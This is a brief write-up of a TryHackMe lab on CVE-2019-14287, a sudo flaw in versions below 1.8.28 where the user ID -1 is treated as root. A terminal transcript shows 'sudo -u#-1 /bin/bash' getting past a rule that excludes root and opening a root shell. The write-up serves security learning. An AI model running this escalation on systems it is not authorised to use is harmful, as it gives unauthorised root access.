# Room
https://tryhackme.com/room/sudovulnsbypass

# Task 1 - Deploy
Deploy and Connect

# Task 2 - Security Bypass
CVE-2019-14287 is a vulnerability found in the Unix Sudo program and works with Sudo versions < 1.8.28.  Sudo is a linux command that allows you to execute programs as another user.  Sudo can be configured with the /etc/sudoers file or with sudo visudo

Examples:
* sudo command_here
* sudo -u#id_here command_here

The exploit invovles taking advantage of a UID less than 0.  When a UID less than 0 is supplied, the program incorrectly reads it as 0, which is the UID of root

Practical
```
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash

tryhackme@sudo-privesc:~$ sudo /bin/bash
[sudo] password for tryhackme: 
Sorry, user tryhackme is not allowed to execute '/bin/bash' as root on sudo-privesc.

tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# whoami
root
```